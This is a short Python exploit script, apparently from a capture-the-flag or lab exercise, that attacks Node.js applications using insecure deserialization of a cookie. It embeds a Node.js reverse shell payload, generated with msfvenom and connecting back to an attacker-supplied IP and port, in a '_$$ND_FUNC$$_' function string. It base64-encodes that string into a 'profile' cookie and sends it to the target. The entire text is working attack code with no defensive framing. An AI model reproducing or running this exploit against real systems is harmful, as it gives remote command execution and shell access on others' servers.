#!/usr/bin/python

from email import header
from html5lib import serialize
import requests,sys, base64

if len(sys.argv) < 4:
    print('[+] Usage: python %s url attackerIP attackerPort'%sys.argv[0])
    exit(0)

proxies = {"http":"http://127.0.0.1:8080"}

url = sys.argv[1]
attackerIP = sys.argv[2]
attackerPort = sys.argv[3]

r = requests.Session()

req = r.get(url,proxies=proxies)

# msfvenom -p nodejs/shell_reverse_tcp LHOST=10.10.14.65 LPORT=4444 !!HAVE TO REPLACE double quotes to single quotes!! 
payload = "var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? 'cmd' : '/bin/sh'; var net = require('net'), cp = require('child_process'), util = require('util'), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(%s, '%s', function() { client.socket.pipe(sh.stdin); if (typeof util.pump === 'undefined') { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on('error', function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat();"%(attackerPort, attackerIP)
json_data = '{"username": "_$$ND_FUNC$$_function (){ %s }()" ,"country":"india","city":"Delhi"}'%(payload)

serialized_data = base64.b64encode(json_data.encode())

headers = {"Cookie": "profile=%s"%serialized_data.decode('utf-8')}

req = r.get(url,proxies=proxies, headers=headers)

if b"An error occurred...invalid username type" in req.content:
    print('[+] Got shell!!')